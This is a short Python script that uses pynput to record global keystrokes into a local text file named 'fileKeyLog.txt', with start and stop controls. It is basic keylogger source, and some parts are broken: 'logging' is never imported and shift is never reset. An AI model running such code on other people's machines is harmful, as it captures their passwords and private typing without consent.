import time
from pynput import keyboard

class appstart:
    path = "fileKeyLog.txt"
    caps = 0
    shift = 0
    running = True

    @staticmethod
    def strLog():
        with open(appstart.path, "r") as file:
            return file.read()

class InterceptKeys:
    listener = None

    @staticmethod
    def startKLog():
        print("Start")
        appstart.running = True
        InterceptKeys.listener.start()

    @staticmethod
    def stopKLog():
        print("Stop")
        appstart.running = False
        if InterceptKeys.listener is not None:
            InterceptKeys.listener.stop()

    @staticmethod
    def onKeyRelease(key):
        print("Key release")
        # if InterceptKeys.listener is not None and appstart.running is False:
            

    @staticmethod
    def onKeyPress(key):
        print("Key press")
        if (appstart.running is False):
            return False
        try:
            with open(appstart.path, "a") as file:
                if key == keyboard.Key.space:
                    file.write(" ")
                elif key == keyboard.Key.enter:
                    file.write("Enter\n")
                elif key == keyboard.Key.backspace:
                    file.write("Backspace")
                elif key == keyboard.Key.tab:
                    file.write("Tab")
                elif key == keyboard.Key.caps_lock:
                    appstart.caps = not appstart.caps
                elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                    appstart.shift = True
                else:
                    if hasattr(key, "char"):
                        char = key.char
                        if appstart.shift or appstart.caps:
                            char = char.upper()
                        else:
                            char = char.lower()
                        file.write(char)
        except Exception as e:
            logging.exception(e)
